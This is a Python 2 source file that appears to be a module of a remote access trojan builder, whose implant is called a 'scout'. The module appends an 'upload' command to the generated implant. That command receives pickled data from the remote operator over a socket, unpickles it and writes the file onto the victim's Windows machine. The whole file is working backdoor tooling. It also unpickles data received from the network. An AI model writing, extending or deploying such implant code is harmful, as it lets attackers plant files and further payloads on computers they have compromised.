# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from pickle import loads')
        config.functions.append('''
def upload():    
    pickled_data = recv_all(s)
    data = loads(pickled_data)
    filename = data[0]
    f = open(filename,'wb')
    f.write(data[1])
    s.sendall('[+]Successfully uploaded file')''')
        config.logics.append('''
            elif command == "upload":
                upload()''')
        config.help_menu['upload <Local file path>'] = 'Remotely upload a file to remote current working directory of scout'
    elif option == 'info':
        print '\nName             : Upload File component' \
              '\nOS               : Windows' \
              '\nRequired Modules : pickle' \
              '\nCommands         : upload <Local file path>' \
              '\nDescription      : Remotely upload a file to remote current working directory of scout\n'
